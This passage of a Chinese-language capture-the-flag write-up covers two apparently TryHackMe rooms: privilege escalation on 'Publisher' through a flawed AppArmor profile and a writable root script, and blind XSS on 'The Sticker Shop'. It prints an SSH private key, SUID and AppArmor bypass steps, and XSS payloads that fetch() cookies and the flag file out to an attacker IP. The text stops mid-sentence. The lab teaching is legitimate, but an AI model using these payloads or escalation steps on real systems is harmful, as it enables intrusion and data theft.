class="hljs-number">56</span>P0Z/HAQfZovFlzgC4xwwW8Mm698H/wss8Lt9wsZq4hMFxmZCdOuZOlYlMsGJgtekVDGL<br>IHjNxGd46wo37cKT9jb27OsONG7BIq7iTee5T59xupekynvIqbAAAAwQDnTuHO27B1PRiV<br>ThENf8Iz+Y8LFcKLjnDwBdFkyE9kqNRT71xyZK8t5O2Ec0vCRiLeZU/DTAFPiR+B6WPfUb<br>kFX8AXaUXpJmUlTLl6on7mCpNnjjsRKJDUtFm0H6MOGD/YgYE4ZvruoHCmQaeNMpc3YSrG<br>vKrFIed5LNAJ3kLWk8SbzZxsuERbybIKGJa8Z9lYWtpPiHCsl1wqrFiB9ikfMa2DoWTuBh<br>+Xk2NGp6e98Bjtf7qtBn/<span class="hljs-number">0</span>rBfdZjveM1MAAADBANoC+jBOLbAHk2rKEvTY1Msbc8Nf2aXe<br>v0M04fPPBE22VsJGK1Wbi786Z0QVhnbNe6JnlLigk50DEc1WrKvHvWND0WuthNYTThiwFr<br>LsHpJjf7fAUXSGQfCc0Z06gFMtmhwZUuYEH9JjZbG2oLnn47BdOnumAOE/mRxDelSOv5J5<br>M8X1rGlGEnXqGuw917aaHPPBnSfquimQkXZ55yyI9uhtc6BrRanGRlEYPOCR18Ppcr5d96<br>Hx4+A+YKJ0iNuyTwAAAA90aGlua0BwdWJsaXNoZXIBAg==<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>给 600 权限（最开始脑子抽了直接给的 777，后面才想起来它的权限最大才 600），用 ssh 登录</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">ssh think@<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">42</span>.<span class="hljs-number">106</span> -i id_rsa<br></code></pre></td></tr></table></figure><p>查找系统中所有设置了 SUID 的可执行文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">think@publisher:~$ <span class="hljs-title">find</span> / -<span class="hljs-title">perm</span> -<span class="hljs-title">u</span>=<span class="hljs-title">s</span> -<span class="hljs-title">type</span> <span class="hljs-title">f</span> 2&gt;/<span class="hljs-title">dev</span>/<span class="hljs-title">null</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">policykit</span>-1/<span class="hljs-title">polkit</span>-<span class="hljs-title">agent</span>-<span class="hljs-title">helper</span>-1</span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">openssh</span>/<span class="hljs-title">ssh</span>-<span class="hljs-title">keysign</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">eject</span>/<span class="hljs-title">dmcrypt</span>-<span class="hljs-title">get</span>-<span class="hljs-title">device</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">dbus</span>-1.0/<span class="hljs-title">dbus</span>-<span class="hljs-title">daemon</span>-<span class="hljs-title">launch</span>-<span class="hljs-title">helper</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">lib</span>/<span class="hljs-title">xorg</span>/<span class="hljs-title">Xorg.wrap</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">pppd</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">run_container</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">at</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">fusermount</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">gpasswd</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">chfn</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">sudo</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">chsh</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">passwd</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">mount</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">su</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">newgrp</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">pkexec</span></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">umount</span></span><br></code></pre></td></tr></table></figure><p>看到了一个不是典型的 SUID 文件</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">/usr/sbin/run_container<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/34ef96d874deacb2.png"></p><p>查看文件发现有一句 <code>bin/bash -p /opt/run_container.sh</code>，说明这将执行 <code>/opt/run_container.sh</code> ，查看 <code>run_container.sh</code> 内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># Function to list Docker containers</span><br><span class="hljs-function"><span class="hljs-title">list_containers</span></span>() &#123;<br>    <span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-subst">$(docker ps -aq)</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;<br>    <span class="hljs-keyword">fi</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;List of Docker containers:&quot;</span><br>    docker ps -a --format <span class="hljs-string">&quot;ID: &#123;&#123;.ID&#125;&#125; | Name: &#123;&#123;.Names&#125;&#125; | Status: &#123;&#123;.Status&#125;&#125;&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br><span class="hljs-comment"># Function to prompt user for container ID</span><br><span class="hljs-function"><span class="hljs-title">prompt_container_id</span></span>() &#123;<br>    <span class="hljs-built_in">read</span> -p <span class="hljs-string">&quot;Enter the ID of the container or leave blank to create a new one: &quot;</span> container_id<br>    validate_container_id <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span><br>&#125;<br><br><span class="hljs-comment"># Function to display options and perform actions</span><br><span class="hljs-function"><span class="hljs-title">select_action</span></span>() &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;OPTIONS:&quot;</span><br>    <span class="hljs-built_in">local</span> container_id=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>    PS3=<span class="hljs-string">&quot;Choose an action for a container: &quot;</span><br>    options=(<span class="hljs-string">&quot;Start Container&quot;</span> <span class="hljs-string">&quot;Stop Container&quot;</span> <span class="hljs-string">&quot;Restart Container&quot;</span> <span class="hljs-string">&quot;Create Container&quot;</span> <span class="hljs-string">&quot;Quit&quot;</span>)<br><br>    <span class="hljs-keyword">select</span> opt <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;options[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-variable">$REPLY</span> <span class="hljs-keyword">in</span><br>            1) docker start <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span>; <span class="hljs-built_in">break</span> ;;<br>            2)  <span class="hljs-keyword">if</span> [ $(docker ps -q | <span class="hljs-built_in">wc</span> -l) -lt 2 ]; <span class="hljs-keyword">then</span><br>                    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;No enough containers are currently running.&quot;</span><br>                    <span class="hljs-built_in">exit</span> 1<br>                <span class="hljs-keyword">fi</span><br>                docker stop <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span><br>                <span class="hljs-built_in">break</span> ;;<br>            3) docker restart <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span>; <span class="hljs-built_in">break</span> ;;<br>            4) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Creating a new container...&quot;</span><br>               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest<br>               <span class="hljs-built_in">break</span> ;;<br>            5) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Exiting...&quot;</span>; <span class="hljs-built_in">exit</span> ;;<br>            *) <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Invalid option. Please choose a valid option.&quot;</span> ;;<br>        <span class="hljs-keyword">esac</span><br>    <span class="hljs-keyword">done</span><br>&#125;<br><br><span class="hljs-comment"># Main script execution</span><br>list_containers<br>prompt_container_id  <span class="hljs-comment"># Get the container ID from prompt_container_id function</span><br>select_action <span class="hljs-string">&quot;<span class="hljs-variable">$container_id</span>&quot;</span>  <span class="hljs-comment"># Pass the container ID to select_action function</span><br></code></pre></td></tr></table></figure><p>必须绕过当前的 shell 限制，才能重写 <code>run_container.sh</code>。并且在 <code>/opt</code> 目录下不能列出文件，但是使用<code>ls -al</code> 显示的是能够读取目录的内容的</p><p><img src="https://img.dkdun.cn/v1/2025/12/2f55ad8d8e7b30b4.png"></p><h2 id="AppArmor"><a href="#AppArmor" class="headerlink" title="AppArmor"></a>AppArmor</h2><p>再回想一下题目描述，“necessitating a deeper exploration into the system’s security profile”，需要对系统的安全配置文件进行更深入的探索</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Attempts <span class="hljs-built_in">to</span> escalate privileges <span class="hljs-keyword">using</span> <span class="hljs-keyword">a</span> custom binary are hindered <span class="hljs-keyword">by</span> restricted access <span class="hljs-built_in">to</span> critical <span class="hljs-keyword">system</span> <span class="hljs-built_in">files</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">directories</span>, necessitating <span class="hljs-keyword">a</span> deeper exploration <span class="hljs-keyword">into</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">system</span><span class="hljs-string">&#x27;s security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.</span><br></code></pre></td></tr></table></figure><p>检查 ACL 和 SELinux 以及 AppArmor</p><p>（简单介绍一下 ACL ，SELinux，AppArmor：ACL 是访问控制表，是由很多条“deny|permit” 语句组成，每一条都是 rule，用于控制网络流量的进出。SELinux 是一个 Linux 内核模块，也是 Linux 的一个安全子系统，为了限制资源的访问。AppArmor 是与 SELinux 类似的一个访问控制系统，通过它可以指定程序的读写权限等等，其实我并不是很了解）</p><p>通过命令可以检测系统有无这些安全配置</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">getfacl /opt //检查 ACL<br>sestatus//检查 SELinux<br>apparmor_status//检查 AppArmor<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d33c360805ef71cd.png"></p><p>“apparmor module is loaded ” 说明 AppArmor 已启用，AppArmor 策略位于 <code>/etc/apparmor.d/</code> 下</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看 <code>/etc/apparmor.d/usr.sbin.ash</code> 内容</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">think@publisher:~$ <span class="hljs-title">cat</span> /<span class="hljs-title">etc</span>/<span class="hljs-title">apparmor.d</span>/<span class="hljs-title">usr.sbin.ash</span></span><br><span class="hljs-function">#<span class="hljs-title">include</span> &lt;<span class="hljs-title">tunables</span>/<span class="hljs-title">global</span>&gt;</span><br><span class="hljs-function"></span><br><span class="hljs-function">/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/<span class="hljs-title">ash</span> <span class="hljs-title">flags</span>=(<span class="hljs-title">complain</span>) &#123;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">base</span>&gt;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">bash</span>&gt;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">consoles</span>&gt;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">nameservice</span>&gt;</span><br><span class="hljs-function">  #<span class="hljs-title">include</span> &lt;<span class="hljs-title">abstractions</span>/<span class="hljs-title">user</span>-<span class="hljs-title">tmp</span>&gt;</span><br><span class="hljs-function"></span><br><span class="hljs-function">  # <span class="hljs-title">Remove</span> <span class="hljs-title">specific</span> <span class="hljs-title">file</span> <span class="hljs-title">path</span> <span class="hljs-title">rules</span></span><br><span class="hljs-function">  # <span class="hljs-title">Deny</span> <span class="hljs-title">access</span> <span class="hljs-title">to</span> <span class="hljs-title">certain</span> <span class="hljs-title">directories</span></span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">opt</span>/ <span class="hljs-title">r</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">opt</span>/** <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">tmp</span>/** <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">dev</span>/<span class="hljs-title">shm</span> <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">var</span>/<span class="hljs-title">tmp</span> <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  <span class="hljs-title">deny</span> /<span class="hljs-title">home</span>/** <span class="hljs-title">w</span>,</span><br><span class="hljs-function">  /<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/** <span class="hljs-title">mrix</span>,</span><br><span class="hljs-function">  /<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>/** <span class="hljs-title">mrix</span>,</span><br><span class="hljs-function"></span><br><span class="hljs-function">  # <span class="hljs-title">Simplified</span> <span class="hljs-title">rule</span> <span class="hljs-title">for</span> <span class="hljs-title">accessing</span> /<span class="hljs-title">home</span> <span class="hljs-title">directory</span></span><br><span class="hljs-function">  <span class="hljs-title">owner</span> /<span class="hljs-title">home</span>/** <span class="hljs-title">rix</span>,</span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure><p>仔细看看就会发现这个配置文件明显存在缺陷，<code>/dev/shm</code> 和 <code>/dev/tmp</code> 缺少了通配符，如果没有通配符，deny 规则仅仅会阻止更改具有这个名称的文件，但他的目录的内容不受影响，允许任意文件写入，所以我们可以写入 <code>/dev/shm</code> 和 <code>/var/tmp</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">deny /dev/shm w,<br>deny /var/tmp w,<br></code></pre></td></tr></table></figure><p>之前访问 <code>/etc/passwd</code> 时会发现</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">root:<span class="hljs-title">x</span>:0:0:<span class="hljs-title">root</span>:/<span class="hljs-title">root</span>:/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">bash</span></span><br></code></pre></td></tr></table></figure><p>那么复制 <code>/bin/bash </code>到 <code>/var/tmp</code> 并运行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">cd</span> /var/tmp<br>cp /bin/bash .<br>./bash<br>ls /opt<br></code></pre></td></tr></table></figure><p>然后现在就可以访问 <code>/opt</code> 了</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">think@publisher:/<span class="hljs-title">var</span>/<span class="hljs-title">tmp</span>$ <span class="hljs-title">ls</span> -<span class="hljs-title">al</span> /<span class="hljs-title">opt</span></span><br><span class="hljs-function"><span class="hljs-title">total</span> 20</span><br><span class="hljs-function"><span class="hljs-title">drwxr</span>-<span class="hljs-title">xr</span>-<span class="hljs-title">x</span>  3 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 4096 <span class="hljs-title">Jan</span> 10  2024 .</span><br><span class="hljs-function"><span class="hljs-title">drwxr</span>-<span class="hljs-title">xr</span>-<span class="hljs-title">x</span> 18 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 4096 <span class="hljs-title">Nov</span> 14  2023 ..</span><br><span class="hljs-function"><span class="hljs-title">drwx</span>--<span class="hljs-title">x</span>--<span class="hljs-title">x</span>  4 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 4096 <span class="hljs-title">Nov</span> 14  2023 <span class="hljs-title">containerd</span></span><br><span class="hljs-function">-<span class="hljs-title">rw</span>-<span class="hljs-title">r</span>--<span class="hljs-title">r</span>--  1 <span class="hljs-title">root</span> <span class="hljs-title">root</span>  861 <span class="hljs-title">Dec</span>  7  2023 <span class="hljs-title">dockerfile</span></span><br><span class="hljs-function">-<span class="hljs-title">rwxrwxrwx</span>  1 <span class="hljs-title">root</span> <span class="hljs-title">root</span> 1715 <span class="hljs-title">Jan</span> 10  2024 <span class="hljs-title">run_container.sh</span></span><br></code></pre></td></tr></table></figure><p>重写 <code>run_container.sh</code> </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">#!/bin/bash<br>cp /bin/bash /var/tmp/Bash<br>chmod +s /var/tmp/Bash<br></code></pre></td></tr></table></figure><p>运行 </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">/usr/sbin/run_container<br></code></pre></td></tr></table></figure><p>现在就已经是 root 了</p><p><img src="https://img.dkdun.cn/v1/2025/12/5164206df1860b5c.png"></p><p>运行 Bash</p><p><img src="https://img.dkdun.cn/v1/2025/12/9ebbe8d57c10a4ae.png"></p><p>得到 root flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">3</span>a<span class="hljs-number">4225</span><span class="hljs-keyword">cc</span><span class="hljs-number">9e85709</span>adda<span class="hljs-number">6</span>ef<span class="hljs-number">55</span>d<span class="hljs-number">6</span>a<span class="hljs-number">4</span>f<span class="hljs-number">2</span>ca<br></code></pre></td></tr></table></figure><p>其实还有一个方法  <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/apparmor?ref=benheater.com#apparmor-shebang-bypass">AppArmor Shebang Bypass</a> 可以绕过 AppArmor</p><p>：）</p><h1 id="The-Sticker-Shop"><a href="#The-Sticker-Shop" class="headerlink" title="The Sticker Shop"></a>The Sticker Shop</h1><h2 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h2><p>Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!</p><p>Can you read the flag at <code>http://10.10.110.119:8080/flag.txt</code>?</p><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><h2 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">nmap -sS -sV -Pn <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">110</span>.<span class="hljs-number">119</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5f3d31dcd6452d34.png" alt="img"></p><p>开放了 8080 和 22 端口</p><h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>老样子，访问 8080 端口，一个商店网站</p><p><img src="https://img.dkdun.cn/v1/2025/12/9cad434d786ac45b.png" alt="img"></p><p>直接访问 <code>flag.txt</code> 会返回 401</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">401 Unauthorized<br></code></pre></td></tr></table></figure><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><img src="https://img.dkdun.cn/v1/2025/12/73127521326842fb.png" alt="img"></p><p>我们能看到有一个 <code>Feedback</code>页面，像 XSS，但是输入 payload 后没回显</p><p>尝试直接弹 cookie</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://10.14.96.245:1234/&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>nc 监听</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">Ncat: <span class="hljs-title">Version</span> 7.95 ( <span class="hljs-title">https</span>://<span class="hljs-title">nmap.org</span>/<span class="hljs-title">ncat</span> )</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> [::]:1234</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> 0.0.0.0:1234</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Connection</span> <span class="hljs-title">from</span> 10.10.110.119:35480.</span><br><span class="hljs-function"><span class="hljs-title">GET</span> / <span class="hljs-title">HTTP</span>/1.1</span><br><span class="hljs-function"><span class="hljs-title">Host</span>: 10.14.96.245:1234</span><br><span class="hljs-function"><span class="hljs-title">Connection</span>: <span class="hljs-title">keep</span>-<span class="hljs-title">alive</span></span><br><span class="hljs-function"><span class="hljs-title">User</span>-<span class="hljs-title">Agent</span>: <span class="hljs-title">Mozilla</span>/5.0 (<span class="hljs-title">X11</span>; <span class="hljs-title">Linux</span> <span class="hljs-title">x86_64</span>) <span class="hljs-title">AppleWebKit</span>/537.36 (<span class="hljs-title">KHTML</span>, <span class="hljs-title">like</span> <span class="hljs-title">Gecko</span>) <span class="hljs-title">HeadlessChrome</span>/119.0.6045.105 <span class="hljs-title">Safari</span>/537.36</span><br><span class="hljs-function"><span class="hljs-title">Accept</span>: */*</span><br><span class="hljs-function"><span class="hljs-title">Origin</span>: <span class="hljs-title">http</span>://127.0.0.1:8080</span><br><span class="hljs-function"><span class="hljs-title">Referer</span>: <span class="hljs-title">http</span>://127.0.0.1:8080/</span><br><span class="hljs-function"><span class="hljs-title">Accept</span>-<span class="hljs-title">Encoding</span>: <span class="hljs-title">gzip</span>, <span class="hljs-title">deflate</span></span><br></code></pre></td></tr></table></figure><p>并没有什么有用的信息</p><p>直接向服务器读取信息反弹到本机上，payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://10.10.110.119:8080/flag.txt&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> &#123;<span class="hljs-keyword">return</span> response.<span class="hljs-title function_">text</span>();&#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&quot;http://10.14.96.245:1234/&quot;</span>+data);&#125;)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>返回信息</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">Ncat: <span class="hljs-title">Version</span> 7.95 ( <span class="hljs-title">https</span>://<span class="hljs-title">nmap.org</span>/<span class="hljs-title">ncat</span> )</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> [::]:1234</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Listening</span> <span class="hljs-title">on</span> 0.0.0.0:1234</span><br><span class="hljs-function"><span class="hljs-title">Ncat</span>: <span class="hljs-title">Connection</span> <span class="hljs-title">from</span> 10.10.110.119:43650.</span><br><span class="hljs-function"><span class="hljs-title">GET</span> /<span class="hljs-title">THM</span>%7<span class="hljs-title">B83789a69074f636f64a38879cfcabe8b62305ee6</span>%7<span class="hljs-title">D</span> <span class="hljs-title">HTTP</span>/1.1</span><br><span class="hljs-function"><span class="hljs-title">Host</span>: 10.14.96.245:1234</span><br><span class="hljs-function"><span class="hljs-title">Connection</span>: <span class="hljs-title">keep</span>-<span class="hljs-title">alive</span></span><br><span class="hljs-function"><span class="hljs-title">User</span>-<span class="hljs-title">Agent</span>: <span class="hljs-title">Mozilla</span>/5.0 (<span class="hljs-title">X11</span>; <span class="hljs-title">Linux</span> <span class="hljs-title">x86_64</span>) <span class="hljs-title">AppleWebKit</span>/537.36 (<span class="hljs-title">KHTML</span>, <span class="hljs-title">like</span> <span class="hljs-title">Gecko</span>) <span class="hljs-title">HeadlessChrome</span>/119.0.6045.105 <span class="hljs-title">Safari</span>/537.36</span><br><span class="hljs-function"><span class="hljs-title">Accept</span>: */*</span><br><span class="hljs-function"><span class="hljs-title">Origin</span>: <span class="hljs-title">http</span>://127.0.0.1:8080</span><br><span class="hljs-function"><span class="hljs-title">Referer</span>: <span class="hljs-title">http</span>://127.0.0.1:8080/</span><br><span class="hljs-function"><span class="hljs-title">Accept</span>-<span class="hljs-title">Encoding</span>: <span class="hljs-title">gzip</span>, <span class="hljs-title">deflate</span></span><br></code></pre></td></tr></table></figure><p>URLdecode 